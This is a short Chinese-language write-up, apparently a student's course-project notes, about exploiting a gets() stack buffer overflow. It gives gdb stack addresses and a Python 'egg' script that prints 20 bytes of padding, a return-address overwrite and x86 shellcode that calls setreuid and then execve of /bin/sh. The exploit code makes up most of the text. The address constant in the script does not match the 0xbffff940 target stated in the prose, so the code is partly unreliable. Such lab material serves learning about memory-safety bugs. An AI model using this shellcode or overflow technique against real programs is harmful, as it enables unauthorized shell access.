通过gdb 我们可以看到door数组的地址在0xbffff928处，该函数的eip存储的位置0xbffff93c处，相20个字节，那我们将这20个字节填充为A, 在0xbffff93c处 覆盖为 4+0xbffff93c = 0xbffff940 ，为什么是这个地址，因为我们将继续向上覆盖，从oxbffff940处就开始输入我们的Shellcode程序了。

pwnable:~$ cat egg
#!/usr/bin/env python3

import codecs
import sys

sys.stdout = codecs.getwriter("latin1")(sys.stdout.buffer)


OVERWRITER_ADDRESS = "\x3c\xf9\xff\xfb"

SHELLCODE = \
    '\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a' \
    '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2d\x69' \
    '\x69\x69\x89\xe2\x50\x68\x2b\x6d\x6d\x6d' \
    '\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f' \
    '\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89' \
    '\xe1\x31\xd2\xb0\x0b\xcd\x80'

for i in range(0,20):
    print("A", end = "")
print(OVERWRITER_ADDRESS, end = "")
print(SHELLCODE, end = "")

我们只用将这段程序的输出作为第一段C语言程序的输入就可以利用gets函数的漏洞执行这段shellcode了

其实这个project1中的小问题主要是让我们了解对于这些栈溢出的漏洞是如何被攻击的，以及了解C中的函数栈格式，同时还有gdb的使用，我现在对gdb的使用还是不太熟练。
